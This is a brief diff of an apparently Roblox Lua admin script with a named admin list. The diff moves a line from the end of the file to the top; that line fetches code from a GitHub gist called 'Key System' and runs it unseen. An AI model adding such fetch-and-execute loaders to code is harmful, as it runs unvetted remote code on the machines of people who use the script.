@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/MainScripts352/a389001eb0a473611c53e520920336b5/raw/8a125f1ba0cf0522cf1da24dcb9e225e081a1bc4/Key%2520System"))()
+
 Ghostplayer = "seth_ka123"
 local Admins = {"Pxrple001","bestgamer_pogi24","EC_BOT1"}
 
@@ -265,5 +267,3 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
    end
    end)
 end
-
-loadstring(game:HttpGet("https://gist.githubusercontent.com/MainScripts352/a389001eb0a473611c53e520920336b5/raw/8a125f1ba0cf0522cf1da24dcb9e225e081a1bc4/Key%2520System"))()
